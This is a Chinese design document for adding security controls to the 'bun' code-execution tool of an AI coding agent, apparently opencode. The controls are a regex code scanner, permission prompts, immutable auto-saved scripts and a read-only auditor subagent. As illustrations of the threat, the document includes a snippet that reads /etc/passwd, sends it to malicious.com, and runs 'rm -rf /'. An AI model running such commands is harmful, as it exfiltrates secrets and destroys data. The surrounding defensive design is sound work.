# bun 工具安全升级 — 详细设计文档

> 本文档约 2000+ 行，包含完整的机制说明、实现细节和代码位点。

---

## 目录

1. [问题分析](#1-问题分析)
2. [总体架构](#2-总体架构)
3. [模块一：bun-audit.ts — TS 代码审计扫描器](#3-模块一bun-auditts--ts-代码审计扫描器)
4. [模块二：bun.ts — 权限检查链](#4-模块二bunts--权限检查链)
5. [模块三：bun.ts — 自动保存与不可变性](#5-模块三bunts--自动保存与不可变性)
6. [模块四：审计上下文传递](#6-模块四审计上下文传递)
7. [模块五：auditor 代理](#7-模块五auditor-代理)
8. [模块六：注册到工具列表](#8-模块六注册到工具列表)
9. [完整执行流程](#9-完整执行流程)
10. [边界情况与错误处理](#10-边界情况与错误处理)
11. [逐步骤实施计划](#11-逐步骤实施计划)

---

## 1. 问题分析

### 现状

bun 工具（[`src/tool/bun.ts:22`](packages/opencode/src/tool/bun.ts:22)）定义了一个强大的 "在 Bun 运行时中执行 TypeScript/JavaScript 代码" 工具。但它存在严重的安全缺陷：

| 安全特性 | shell 工具 | bun 工具 |
|----------|-----------|---------|
| 外部目录授权 | ✅ `containsPath` + `assertExternalDirectoryEffect` | ❌ 无 |
| 命令级代码授权 | ✅ tree-sitter AST 提取文件路径 → `ctx.ask` | ❌ 无 |
| 网络请求授权 | ❌ 受限 | ❌ 无 |
| Git 安全规则 | ✅ `checkGitRules` | ❌ 无 |
| 注册到工具列表 | ✅ | ❌ **未注册**（registry.ts 未引入） |

### 安全隐患举例

```typescript
// bun 工具传入此代码，当前无任何授权检查
const data = fs.readFileSync('/etc/passwd')
await fetch('https://malicious.com/exfil?data=' + data)
exec('rm -rf /')
```

### 需求

1. bun 工具权限提升到 shell 级别：AST 扫描 + `assertExternalDirectoryEffect`
2. 所有代码执行后自动保存到 `.opencode/scripts/`，chmod 0444 冻结，不可修改
3. 保存后触发审计上下文，通过 `auditor` 代理进行安全审计
4. 注册到工具列表使其实际可用
5. 删除现已无用的 `bun_save` 工具

---

## 2. 总体架构

```
┌─────────────────────────────────────────────────────────┐
│                    bun 工具执行流程                        │
├─────────────────────────────────────────────────────────┤
│  ① 参数校验（workdir 合法性）                              │
│  ② npm 包安全检查（已有 BunSecurity）                      │
│  ③ workdir external_directory 授权（新增）                 │
│  ④ TS 代码扫描 scanCode()（新增 bun-audit.ts）              │
│     ├─ 提取文件读/写/删路径                                │
│     ├─ 提取 npm 包名 → BunSecurity 复用                    │
│     ├─ 检测网络请求标记                                    │
│     ├─ 检测外部命令                                        │
│     └─ 检测环境变量读取                                    │
│  ⑤ 权限检查链（新增）                                      │
│     ├─ 外部文件路径 → assertExternalDirectoryEffect          │
│     ├─ 网络请求 → ctx.ask("bun.network")                   │
│     └─ 外部命令 → ctx.ask("bun.exec")                      │
│  ⑥ 写入 tmp 文件并执行 bun run                             │
│  ⑦ 清理 tmp 文件                                          │
│  ⑧ 自动保存到 .opencode/scripts/ + chmod 0444（新增）       │
│  ⑨ 审计上下文 ctx.ask("bun.audit")（新增）                  │
│  ⑩ 返回执行结果                                           │
└─────────────────────────────────────────────────────────┘
```

---

## 3. 模块一：bun-audit.ts — TS 代码审计扫描器

### 3.1 文件位置

**新建** [`packages/opencode/src/tool/bun-audit.ts`](packages/opencode/src/tool/bun.ts:1)（与 bun.ts 同级）

### 3.2 数据结构

```typescript
export interface BunAccess {
  /** resolve 后的绝对路径列表 — 读取 */
  reads: string[]
  /** resolve 后的绝对路径列表 — 写入 */
  writes: string[]
  /** resolve 后的绝对路径列表 — 删除 */
  deletes: string[]
  /** npm 包名（bare specifiers, 如 "fs"、"@scope/pkg"） */
  packages: string[]
  /** 本地模块 import path（未 resolve，如 "./utils"） */
  localImports: string[]
  /** 是否有网络请求 */
  networks: boolean
  /** 读取的环境变量名列表 */
  env: string[]
  /** 检测到的外部命令描述（标记用） */
  execs: string[]
  /** 是否有动态特性（import()、eval、Function()） */
  hasDynamic: boolean
}
```

### 3.3 检测机制：分步正则扫描

#### 3.3.1 包导入检测（import / require / import()）

**正则策略**：捕获所有 specifier，然后分类。

```
捕获模式名        | 正则                                                      | 示例匹配
import-from      | /(?:import|export)\s+\{[^}]*\}\s+from\s+['"]([^'"]+)['"]/g | import {x} from "fs"
import-default   | /(?:import|export)\s+\w+\s+from\s+['"]([^'"]+)['"]/g       | import _ from "lodash"
import-side      | /import\s+['"]([^'"]+)['"]/g                               | import "dotenv/config"
import-ns        | /import\s+\*\s+as\s+\w+\s+from\s+['"]([^'"]+)['"]/g       | import * as X from "effect"
require-call     | /require\s*\(\s*['"]([^'"]+)['"]\s*\)/g                    | require("axios")
import-call      | /import\s*\(\s*['"]([^'"]+)['"]\s*\)/g                     | await import("dayjs")
```

**分类规则**（`classifySpecifier(spec: string): "package" | "local" | "absolute"`）：

```typescript
function classifySpecifier(spec: string): "package" | "local" | "absolute" {
  // 以 "." 开头 → 相对路径（本地模块）
  if (spec.startsWith(".")) return "local"
  // 以 "/" 开头 → 绝对路径
  if (spec.startsWith("/")) return "absolute"
  // 以 "~/" 开头 → home 目录
  if (spec.startsWith("~/") || spec === "~") return "local"
  // 以 "@" 开头但非 "~" → scoped 包
  if (spec.startsWith("@")) return "package"
  // 其他 → bare specifier（npm 包）
  return "package"
}
```

**结果映射**：
- `"package"` → 加入 `packages` 列表，之后传给 `BunSecurity.resolveAndCheck()`
- `"local"` → 加入 `localImports` 列表，同时 resolve 后加入 `reads`
- `"import()` 动态导入` → 加入 `hasDynamic = true`

#### 3.3.2 文件读取检测

| 目标 API | 正则 | 参数提取 | 判断逻辑 |
|----------|------|---------|---------|
| `Bun.file(path).text()` | `/Bun\.file\s*\(\s*([^)]+?)\s*\)\s*\.\s*(?:text\|json\|bytes\|stream\|arrayBuffer)\s*\(/g` | 组1 = path | 简单参数直接 resolve，含变量跳过 |
| `Bun.file(path).text({...})` | 同上，兼容 `\(` 后的参数 | 同上 | 同上 |
| `fs.readFileSync(path, ...)` | `/fs(?:\.promises)?\.readFileSync\s*\(\s*([^,)]+?)(?:\s*[,\)])/g` | 组1 = path | 同上 |
| `fs.readFile(path, ...)` | `/fs(?:\.promises)?\.readFile\s*\(\s*([^,)]+?)(?:\s*[,\)])/g` | 组1 = path | 同上 |
| `fsPromises.readFile(path, ...)` | `/fsPromises\.readFile\s*\(\s*([^,)]+?)(?:\s*[,\)])/g` | 组1 = path | 同上 |
| `fs.promises.readFile(path, ...)` | 已在 `fs(?:\.promises)?` 覆盖 | — | — |

#### 3.3.3 文件写入检测

| 目标 API | 正则 | 参数提取 |
|----------|------|---------|
| `Bun.write(path, data)` | `/Bun\.write\s*\(\s*([^,)]+?)\s*,/g` | 第一个参数 = path |
| `Bun.write(path, data, ...)` | 同上 | 同上 |
| `fs.writeFileSync(path, data)` | `/fs(?:\.promises)?\.writeFileSync\s*\(\s*([^,)]+?)(?:\s*[,\)])/g` | 同上 |
| `fs.writeFile(path, data)` | `/fs(?:\.promises)?\.writeFile\s*\(\s*([^,)]+?)(?:\s*[,\)])/g` | 同上 |
| `fs.appendFileSync(path, data)` | `/fs(?:\.promises)?\.appendFileSync\s*\(\s*([^,)]+?)(?:\s*[,\)])/g` | 同上 |
| `fs.appendFile(path, data)` | `/fs(?:\.promises)?\.appendFile\s*\(\s*([^,)]+?)(?:\s*[,\)])/g` | 同上 |
| `Bun.write(fd, ...)` | 同上（但 fd 是数字，会被 resolvePath 返回 null） | 数字 → null，文件路径 → 有效 |

#### 3.3.4 文件删除检测

| 目标 API | 正则 |
|----------|------|
| `fs.unlinkSync(path)` | `/fs(?:\.promises)?\.unlinkSync\s*\(\s*([^,)]+?)\s*\)/g` |
| `fs.unlink(path)` | `/fs(?:\.promises)?\.unlink\s*\(\s*([^,)]+?)(?:\s*[,\)])/g` |
| `fs.rmSync(path)` | `/fs(?:\.promises)?\.rmSync\s*\(\s*([^,)]+?)(?:\s*[,\)])/g` |
| `fs.rm(path)` | `/fs(?:\.promises)?\.rm\s*\(\s*([^,)]+?)(?:\s*[,\)])/g` |
| `fs.rmdirSync(path)` | `/fs(?:\.promises)?\.rmdirSync\s*\(\s*([^,)]+?)(?:\s*[,\)])/g` |
| `fs.rmdir(path)` | `/fs(?:\.promises)?\.rmdir\s*\(\s*([^,)]+?)(?:\s*[,\)])/g` |

#### 3.3.5 网络请求检测

| 目标 API | 正则 | 结果 |
|----------|------|------|
| `fetch(url)` | `/\bfetch\s*\(/g` | `networks = true` |
| `new WebSocket(url)` | `/new\s+WebSocket\s*\(/g` | `networks = true` |
| `new EventSource(url)` | `/new\s+EventSource\s*\(/g` | `networks = true` |
| `XMLHttpRequest` | `/new\s+XMLHttpRequest\s*\(/g` | `networks = true` |

**注意**：只检查是否被调用，不分析 URL。因为 URL 可能是变量。

#### 3.3.6 外部命令检测

| 目标 API | 正则 | 结果 |
|----------|------|------|
| `spawn(cmd, ...)` | `/\bspawn\s*\(/g` | `execs.push("spawn")` |
| `exec(cmd, ...)` | `/\bexec\s*\(/g` | `execs.push("exec")` |
| `execSync(cmd, ...)` | `/\bexecSync\s*\(/g` | `execs.push("execSync")` |
| `execFileSync(cmd, ...)` | `/\bexecFileSync\s*\(/g` | `execs.push("execFileSync")` |
| `Bun.$` | `/Bun\s*\.\s*\$`/g` | `execs.push("bun-shell")` |
| `child_process.spawn` | `/child_process\s*\.\s*spawn\|require\(['"]child_process['"]\)/g` | `execs.push("child_process")` |

#### 3.3.7 环境变量检测

| 模式 | 正则 | 结果 |
|------|------|------|
| `process.env.NAME` | `/process\.env\.(\w+)/g` | `env.push("NAME")` |
| `process.env["NAME"]` | `/process\.env\s*\[\s*['"]([^'"]+)['"]\s*\]/g` | `env.push("NAME")` |

#### 3.3.8 动态特性检测

| 模式 | 正则 | 结果 |
|------|------|------|
| `eval(` | `/\beval\s*\(/g` | `hasDynamic = true` |
| `new Function(` | `/new\s+Function\s*\(/g` | `hasDynamic = true` |
| `import(` | `/import\s*\(/g` | 已在包检测中覆盖 |

### 3.4 路径解析器：resolvePath()

```typescript
/**
 * 从代码中提取的路径字符串 → 绝对路径（或 null）
 *
 * 原则：安全优先——无法准确解析时返回 null（跳过检查而不是误报）
 * 常见可解析模式：
 *   - 字符串字面量: "path/to/file", '/abs/path', `path`
 *   - 路径拼接: "base/" + name（无法解析）
 *   - 模板字符串: `path/${var}`（无法解析）
 *   - 变量引用: someVariable（无法解析）
 *
 * @param raw 从代码中提取的原始字符串（含引号）
 * @param cwd 工作目录，用于解析相对路径
 * @returns 规范化后的绝对路径，或 null（无法解析）
 */
function resolvePath(raw: string, cwd: string): string | null {
  let p = raw.trim()

  // ── 第一阶段：去引号 ──
  // 支持: "path", 'path', `path`, "path'", etc.
  // 不处理: 字符串拼接 "a" + variable, 模板 `a${b}`
  if ((p.startsWith('"') || p.startsWith("'") || p.startsWith("`")) &&
      (p.endsWith('"') || p.endsWith("'") || p.endsWith("`"))) {
    p = p.slice(1, -1)
  } else {
    // 不是简单字符串字面量（可能是变量或表达式）
    return null
  }

  // ── 第二阶段：跳过不可静态分析的表达式 ──
  // 模板字符串（含 ${}）
  if (p.includes("${")) return null
  // 字符串拼接（+ 号，但排除路径中的 +）
  if (p.includes("+") && !p.includes("+.") && !p.includes("+/")) return null
  // 函数调用
  if (/^[a-zA-Z_]\w*\s*\(/.test(p)) return null
  // 标识符（全字母，非路径）
  if (/^[a-zA-Z_]\w*$/.test(p) && !p.startsWith("~")) return null

  // ── 第三阶段：规范化 ──
  // 协议 URL（http://, https://, file://）— 不是文件路径
  if (/^[a-zA-Z][a-zA-Z0-9+.-]*:\/\//.test(p)) return null

  // 相对路径（以 . 开头）
  if (p.startsWith(".")) return path.resolve(cwd, p)

  // 绝对路径（以 / 开头，或 Windows 盘符）
  if (path.isAbsolute(p)) return path.normalize(p)

  // ~ home 目录
  if (p.startsWith("~/")) return path.join(os.homedir(), p.slice(2))

  // 其他（bare specifier 或不可解析表达式）
  return null
}
```

### 3.5 边界情况处理

| 场景 | 处理方式 | 原因 |
|------|---------|------|
| `Bun.file(variable).text()` | variable 不是字符串字面量 → `resolvePath` 返回 null → 跳过 | 不能静态分析变量值 |
| `Bun.file(\`path/${name}\`).text()` | 模板字符串含 `${}` → `resolvePath` 返回 null → 跳过 | 同上 |
| `fs.writeFile(fd, data)` | fd 是数字 → `resolvePath` 通过 `isAbsolute` 检查失败 → null | 数字不是路径 |
| `import { x } from 'fs'` | `isBareSpecifier` 返回 true → `packages` 列表 | npm 包 |
| `import { x } from ''` | 空字符串 → `resolvePath` 返回空路径 → 但会被 BunSecurity 检查 | 异常输入 |
| `fetch('https://evil.com')` | 正则匹配到 fetch → `networks = true` | 无论 URL 是什么 |
| 大量 import 语句 | 正则遍历所有匹配，`packages` 用 `includes` 去重 | 避免重复检查 |
| 每行 10000 字符的大文件 | 回溯灾难? `[^)]+?` 在极长行上性能差 → 限制单行最大 5000 字符 | 预防 ReDoS |

### 3.6 scanCode() 完整实现伪代码

```typescript
export function scanCode(code: string, cwd: string): BunAccess {
  const access: BunAccess = initEmptyAccess()
  
  // 限制每行长度防 ReDoS（可选：在正则前截断）
  const lines = code.split("\n").map(l => l.length > 5000 ? l.slice(0, 5000) : l)
  const safe = lines.join("\n")
  
  // 顺序：所有正则模式遍历，去重加入结果
  scanImports(safe, access, cwd)
  scanBunFile(safe, access, cwd)
  scanBunWrite(safe, access, cwd)
  scanFsRead(safe, access, cwd)
  scanFsWrite(safe, access, cwd)
  scanFsDelete(safe, access, cwd)
  scanNetwork(safe, access)
  scanExec(safe, access)
  scanEnv(safe, access)
  scanDynamic(safe, access)
  
  return access
}
```

---

## 4. 模块二：bun.ts — 权限检查链

### 4.1 新增 import

在 [`bun.ts:1-8`](packages/opencode/src/tool/bun.ts:1-8) 的现有 import 块中新增：

```typescript
import { assertExternalDirectoryEffect } from "./external-directory"
import { containsPath } from "../project/instance-context"
import { InstanceState } from "@/effect/instance-state"
import { scanCode } from "./bun-audit"
import * as fs from "fs/promises"
```

**注意**：`InstanceState` 和 `containsPath` 已在项目中广泛使用，确认可在 bun.ts 中 import。

### 4.2 权限检查链插入位置

在 [`bun.ts:92`](packages/opencode/src/tool/bun.ts:92)（`} // 安全检查结束`）之后，[`bun.ts:94`](packages/opencode/src/tool/bun.ts:94)（`const tmpFile = ...`）之前插入：

```typescript
// ═══════════════════════════════════════════════
// 新增：权限检查链
// ═══════════════════════════════════════════════

// 1. workdir 外部目录授权
if (params.workdir) {
  yield* assertExternalDirectoryEffect(ctx, params.workdir, { kind: "directory" })
}

// 2. TS AST 扫描
const access = scanCode(params.code, cwd)

// 3. 外部文件路径授权（去重后过滤项目内路径）
const instanceCtx = yield* InstanceState.context
const externalFiles = [
  ...access.reads,
  ...access.writes,
  ...access.deletes,
].filter((f, i, arr) => arr.indexOf(f) === i) // 去重
  .filter(f => !containsPath(f, instanceCtx))  // 只检查项目外的

for (const f of externalFiles) {
  yield* assertExternalDirectoryEffect(ctx, f)
}

// 4. 网络请求授权
if (access.networks) {
  yield* ctx.ask({
    permission: "bun.network",
    patterns: ["*"],
    always: ["*"],
    metadata: { scriptId, hasDynamic: access.hasDynamic },
  })
}

// 5. 外部命令授权
if (access.execs.length > 0) {
  yield* ctx.ask({
    permission: "bun.exec",
    patterns: access.execs,
    always: ["*"],
    metadata: { scriptId, execs: access.execs },
  })
}
// ═══════════════════════════════════════════════
```

### 4.3 权限模型说明

| Permission | 触发条件 | 用户看到 |
|-----------|---------|---------|
| `external_directory` | 有代码访问项目外的文件路径 | "是否允许访问 /etc/passwd？" |
| `bun.network` | scanCode 检测到 `fetch()`/`WebSocket()` | "此脚本需要发起网络请求，是否允许？" |
| `bun.exec` | scanCode 检测到 `spawn()`/`exec()` | "此脚本需要执行外部命令 [spawn]，是否允许？" |

**交互逻辑**：
- 所有 `ctx.ask` 都带 `always: ["*"]` → 用户选择 "always allow" 后不再询问
- 任何授权被拒绝 → 工具返回错误信息而不执行代码

---

## 5. 模块三：bun.ts — 自动保存与不可变性

### 5.1 保存位置

```
{projectRoot}/.opencode/scripts/bun_{timestamp}_{id}.ts
```

其中：
- `projectRoot` = `ctx.extra?.worktree` ?? `cwd`（从现有逻辑 [`bun.ts:33`](packages/opencode/src/tool/bun.ts:33) 衍生）
- `timestamp` = `Date.now()`（毫秒级，确保唯一性）
- `id` = `scriptId`（UUID 片段，[`bun.ts:32`](packages/opencode/src/tool/bun.ts:32)）

**文件名冲突**：由于包含毫秒时间戳和随机 UUID，同一进程内不可能冲突。

### 5.2 自动保存代码（在清理 tmp 之后、返回之前）

**插入位置**：在 [`bun.ts:139`](packages/opencode/src/tool/bun.ts:139)（`Bun.$rm -f ${tmpFile}`）之后，[`bun.ts:141`](packages/opencode/src/tool/bun.ts:141)（`const output = ...`）之前。

```typescript
// ═══════════════════════════════════════════════
// 新增：自动保存脚本
// ═══════════════════════════════════════════════
const scriptsDir = path.join(
  (ctx.extra?.worktree as string) ?? (ctx.extra?.directory as string) ?? cwd,
  ".opencode", "scripts",
)
const saveFilename = `bun_${Date.now()}_${scriptId}.ts`
const savePath = path.join(scriptsDir, saveFilename)

// 创建目录（存在则无操作）
yield* Effect.promise(() =>
  Bun.$`mkdir -p ${scriptsDir}`.catch(() => {}),
)

// 写入源码
yield* Effect.promise(() => Bun.write(savePath, params.code))

// chmod 0444 → 文件所有者只读，不可修改
// Windows 上 chmod 只影响 ACL，但 Bun 的 chmod 会映射到 Windows ACL
yield* Effect.promise(() => fs.chmod(savePath, 0o444))

// 记录到脚本索引
yield* Effect.promise(() =>
  scriptIndexSave({
    id: `auto_${scriptId}`,
    description: `Auto-saved bun script`,
    path: savePath,
    sessionID: ctx.sessionID,
    immutable: true,
  }),
)
// ═══════════════════════════════════════════════
```

### 5.3 不可变性的保证

**文件系统层面**：`chmod 0444` 移除写权限。类 Unix 系统上 `open(path, O_WRONLY)` 返回 EACCES。Windows 上 `Bun.write(path)` 和 `fs.writeFileSync(path)` 也会失败。

**脚本索引层面**：保存时标记 `immutable: true`，索引文件也可手动删除，但文件系统权限是真正的保护。

**后续读取**：`bun_save` 已删除，不会再尝试覆写。如果未来有类似工具，应先检查索引中的 `immutable` 标记。

### 5.4 删除 BunSaveTool

[`bun.ts:184-277`](packages/opencode/src/tool/bun.ts:184-277) 整个 block 删除，包括：

- `SaveParameters` (第 186-191 行)
- `BunSaveTool` (第 193-277 行)
- `export const BunSaveTool` 导出

**保留**：
- `scriptIndexPath()` (第 281 行)
- `scriptIndexSave()` (第 283-299 行)
- `scriptIndexList()` (第 301-305 行)
- `export * as Bun from "./bun"` (第 307 行)

这些供自动保存功能复用。

---

## 6. 模块四：审计上下文传递

### 6.1 设计原则

审计**不自动 fork 子代理**，因为：
1. bun 工具无权调用 `ops.prompt()`（只有 task 工具有）
2. 自动 fork 会在每个 bun 调用时弹出一个后台窗口，用户体验差
3. 审计不是紧急路径，让 LLM 判断是否审计更灵活

### 6.2 审计信息通过 ctx.ask() metadata 传递

在自动保存之后（第 5.2 节代码之后）、返回结果之前插入：

```typescript
// ═══════════════════════════════════════════════
// 新增：审计上下文
// ═══════════════════════════════════════════════
yield* ctx.ask({
  permission: "bun.audit",
  patterns: [savePath],
  always: ["*"],
  metadata: {
    scriptId,
    path: savePath,
    filename: saveFilename,
    description: "审核此自动保存的 bun 脚本以发现安全风险",
    // 不传 code（太大），审计 agent 通过 read 工具读取
  },
})
// ═══════════════════════════════════════════════
```

### 6.3 审计上下文传递链路

```
Step 1: bun 工具
  ↓
  保存脚本 → d:/dev/s-code/.opencode/scripts/bun_1749133456789_a1b2.ts
  ↓
  ctx.ask("bun.audit") → metadata 中包含 { path, filename, scriptId }
  ↓ 用户选择 "once" 或 "always"
Step 2: LLM 看到审计上下文在返回 metadata 中
  ↓
  LLM 决定: 是否调用 task + auditor 进行深度分析
  ↓
Step 3 (可选): LLM 调用 task 工具
  task({
    description: "audit bun_1749133456789_a1b2.ts",
    prompt: "请读取 {path} 并审计其安全性...",
    subagent_type: "auditor",
  })
  ↓
Step 4: auditor 代理执行
  auditor 用 read 工具读取脚本文件
  auditor 分析代码安全性
  auditor 输出审计结论
```

### 6.4 审计信息在工具返回结果中的体现

```typescript
// bun 工具返回结果包含审计上下文
return {
  output: `[exit: 0]\nHello World`,
  title: `bun#${scriptId}`,
  metadata: {
    scriptId,
    exitCode: 0,
    saved: savePath,  // 新增：自动保存路径
    audit: {           // 新增：审计上下文
      filename: saveFilename,
      path: savePath,
      status: "pending",
    },
  },
}
```

---

## 7. 模块五：auditor 代理

### 7.1 代理配置

**位点**：[`agent.ts:199`](packages/opencode/src/agent/agent.ts:199)（explore 代理之后）

```typescript
auditor: {
  name: "auditor",
  description: "安全审计代理，严格分析脚本和代码的安全性。只允许读取操作，禁止任何修改。",
  permission: Permission.merge(
    defaults,
    Permission.fromConfig({
      "*": "deny",                    // 默认禁止所有工具
      read: { "*": "allow" },         // 只允许读取文件
      grep: "allow",                  // 允许搜索代码
      glob: "allow",                  // 允许文件列表
      plan_exit: "allow",             // 允许退出
      websearch: "allow",             // 允许搜索威胁情报
      external_directory: {           // 允许读取任何位置的脚本
        "*": "allow",
      },
    }),
    user,
  ),
  options: {},
  mode: "subagent",
  native: true,
},
```

### 7.2 代理的权限限制

| 工具 | 权限 | 原因 |
|------|------|------|
| read | allow | 必须能读取脚本内容 |
| grep | allow | 搜索代码中的可疑模式 |
| glob | allow | 定位文件 |
| write | deny | 禁止修改任何文件 |
| edit | deny | 禁止编辑 |
| apply_patch | deny | 禁止打补丁 |
| shell | deny | 禁止执行命令 |
| webfetch | deny | 禁止网络请求（除了 websearch） |
| websearch | allow | 可查已知威胁 |
| bun | deny | 禁止执行代码 |
| task | deny | 禁止再派生子代理 |

### 7.3 审计 agent 的使用 prompt

当 LLM 调用 task + auditor 时，应该生成如下 prompt：

```
你是一个严格的安全审计 agent。

请审计以下脚本的安全性：

脚本路径: {path}
脚本内容（通过 read 工具读取）:
{代码内容}

审计清单（逐项严格检查）:
1. [文件系统] 是否读取或写入了项目目录外的文件？
   - 检查 Bun.file(), fs.readFile, fs.writeFile, fs.unlink 等
2. [网络请求] 是否发起网络请求？
   - 检查 fetch(), new WebSocket(), axios 等
3. [外部命令] 是否执行 shell 命令？
   - 检查 spawn(), exec(), Bun.$ 等
4. [硬编码密钥] 是否包含 API key、token、密码？
   - 检查 "sk-", "api_key", "password", "token", "secret" 等模式
5. [数据外泄] 是否有可能将敏感数据发送到外部？
   - 检查读取敏感文件后调用 fetch
6. [代码逻辑] 代码的功能是否符合其描述？

输出格式:
{
  "status": "approved" | "flagged" | "suspicious",
  "reasons": ["发现的具体问题1", "发现的具体问题2"],
  "risk_level": "low" | "medium" | "high"
}
```

---

## 8. 模块六：注册到工具列表

### 8.1 修改 `registry.ts`

#### 8.1.1 添加 import

在 [`registry.ts:17`](packages/opencode/src/tool/registry.ts:17) 后（`SessionMessageReadTool` 之后）：

```typescript
import { BunTool } from "./bun"
```

#### 8.1.2 添加 init

在 [`registry.ts:138`](packages/opencode/src/tool/registry.ts:138) 后（`sessionMsgRead` 之后）：

```typescript
const bunTool = yield* BunTool
```

#### 8.1.3 添加 Effect.all

在 [`registry.ts:248`](packages/opencode/src/tool/registry.ts:248) 后（`session_message_read` 之后）：

```typescript
bun: Tool.init(bunTool),
```

#### 8.1.4 添加 builtin 列表

在 [`registry.ts:271`](packages/opencode/src/tool/registry.ts:271) 前（`tool.session_message_read` 之前）：

```typescript
tool.bun,
```

---

## 9. 完整执行流程

```
用户输入 code = "Bun.file('./data.json').text()"
  │
  ▼
① packages 检查 → 无 packages，跳过
  │
  ▼
② workdir 检查 → 无 workdir，跳过
  │
  ▼
③ scanCode(code, cwd)
  │  ├─ 检测到 Bun.file('./data.json').text()
  │  └─ access.reads = ["/home/user/project/data.json"]
  │
  ▼
④ InstanceState.context → instanceCtx.directory = "/home/user/project"
  │
  ▼
⑤ containsPath("./data.json", instanceCtx) → true（在项目内）
  │  └─ 跳过 assertExternalDirectoryEffect
  │
  ▼
⑥ 无 networks、无 execs → 跳过
  │
  ▼
⑦ 写入 tmp 文件，执行 bun run
  │
  ▼
⑧ 清理 tmp
  │
  ▼
⑨ 自动保存到 .opencode/scripts/bun_1749133456789_a1b.ts
  │  └─ chmod 0444
  │
  ▼
⑩ ctx.ask("bun.audit", { path: "...", filename: "bun_1749133456789_a1b.ts" })
  │
  ▼
⑪ 返回结果（含 metadata.saved 和 metadata.audit）
```

---

## 10. 边界情况与错误处理

### 10.1 scanCode 边界情况

| 情况 | 处理 | 理由 |
|------|------|------|
| 空代码 | 返回空 BunAccess（所有字段默认值） | 无操作可执行，但 bun 工具还是会跑空白脚本 |
| 只有注释 | 无匹配 → 空 BunAccess | 正则只匹配有 API 调用的行 |
| 非常长的代码（1MB+） | 每行截断 5000 字符防止 ReDoS | 安全优先 |
| 混淆代码（`eval(atob("..."))`） | hasDynamic = true（检测到 eval）| 动态代码无法静态分析 |
| IIFE `(async () => {...})()` | 不影响，正则按行扫描 | IIFE 内的 API 调用仍可被检测 |
| `import.meta.url` | 不是 `import from` 或 `require`，不匹配 | 不影响 |
| `new URL('./rel', import.meta.url)` | 不会被检测到（new URL 不在检测列表）| 这不是文件系统操作 |

### 10.2 路径解析错误处理

| 输入 | `resolvePath` 结果 | 原因 |
|------|-------------------|------|
| `"'/etc/passwd'"` | null | 嵌套引号，不能可靠解析 |
| `"C:\\Users\\admin\\file.txt"` | `C:\Users\admin\file.txt` | Windows 路径 |
| `\`/tmp/\${name}\`` | null | 含 `${}`，跳过 |
| `"/valid/path"` | `/valid/path` | 简单字符串字面量 |
| `"relative/path"` (不以 . 开头) | null | 不是相对路径，也不是绝对路径 |
| `"./relative/path"` | `cwd/relative/path` | 有效相对路径 |
| `42` (数字 fd) | null（`42` 去引号后 → `42`，`path.isAbsolute("42")` → false）| fd 不是路径 |
| `someVariable` | null | 不是字符串字面量，无引号 |

### 10.3 权限拒绝

如果用户在任一 `ctx.ask` 中选择 "deny"：

```typescript
// ctx.ask 抛 DeniedError → return 错误信息
// execute() 是在 Effect.gen 中，Effect.orDie 会捕获
// 但是为了更好的用户体验，应该 catch 后返回格式化错误

// 但 bun.ts:154 已经是 .pipe(Effect.orDie)
// 需要在每个 ctx.ask 后处理 DeniedError

// 更好的方式：在 execute 中加 catch
}).pipe(
  Effect.catchTags({
    DeniedError: (e) => Effect.succeed({
      output: `❌ 权限被拒绝: ${e.message}`,
      title: "bun (permission denied)",
      metadata: {} as Record<string, unknown>,
    }),
  }),
  Effect.orDie,
)
```

### 10.4 自动保存失败

如果自动保存失败（磁盘满、权限不足等），**不应阻止返回执行结果**。自动保存是附加功能：

```typescript
// 自动保存应使用 catch 保护
const savePath = yield* Effect.gen(function* () {
  // ... 保存逻辑
  return savePath
}).pipe(Effect.catch(() => Effect.succeed("")))
```

---

## 11. 逐步骤实施计划

### 实施顺序

| 步骤 | 文件 | 修改类型 | 说明 |
|------|------|---------|------|
| 1 | `src/tool/bun-audit.ts` | **新建** | scanCode() 完整实现 + BunAccess 接口 |
| 2 | `src/tool/bun.ts` | **修改** | 添加 import（bun-audit, external-directory, instance-context, fs/promises） |
| 3 | `src/tool/bun.ts` | **修改** | execute 中插入权限检查链（external-directory, bun.network, bun.exec） |
| 4 | `src/tool/bun.ts` | **修改** | execute 中插入自动保存逻辑（写入 + chmod + script-index） |
| 5 | `src/tool/bun.ts` | **修改** | 自动保存后插入审计 ctx.ask(bun.audit) |
| 6 | `src/tool/bun.ts` | **修改** | 删除 BunSaveTool 整个 block（SaveParameters + BunSaveTool） |
| 7 | `src/tool/bun.ts` | **保留** | scriptIndexPath/scriptIndexSave/scriptIndexList/export * as Bun |
| 8 | `src/tool/registry.ts` | **修改** | import BunTool + init + Effect.all + builtin 列表 |
| 9 | `src/agent/agent.ts` | **修改** | 在 explore 后添加 auditor 代理 |

### 每步的精确行号

所有位点基于文件当前状态，实施前需最终确认。

**bun.ts 最终结构**（实施后）：

```
行 1-8:   现有 import
行 9-15:  新增 import（bun-audit, external-directory, fs/promises, instance-context）
行 17-20: 现有常数
行 22-30: Parameters Schema
行 32-184: BunTool（execute 函数）
           行 33-41:   参数校验（不变）
           行 44-92:   安全检查（不变）
           行 92-130:  新增权限检查链（scanCode + external-directory + ask）
           行 130-145: 执行 bun run（不变）
           行 145-165: 新增自动保存 + 审计
           行 165-185: 返回结果（不变）
行 186-277: 删除（BunSaveTool）
行 278-305: 保留（scriptIndex 函数）
行 307:     保留（export）
```

### 每步的测试验证

| 步骤 | 验证方法 |
|------|---------|
| 1. bun-audit.ts | `scanCode('Bun.file("./x").text()')` → `reads: ["abs/x"]` |
| 2. import | `bun typecheck` 通过 |
| 3. 权限链 | 执行 `Bun.file("/etc/passwd").text()` → 弹 external_directory 授权 |
| 4. 自动保存 | 执行后 `.opencode/scripts/` 生成文件，`ls -l` 权限 444 |
| 5. 审计 | 执行后 `ctx.ask("bun.audit")` 触发 |
| 6. 删除 | `bun_save` 不再出现在 registry | 
| 7. 保留 | scriptIndex 仍可用 | 
| 8. registry | `bun` 出现在工具列表中 |
| 9. auditor | `task subagent_type=auditor read` 生效 |
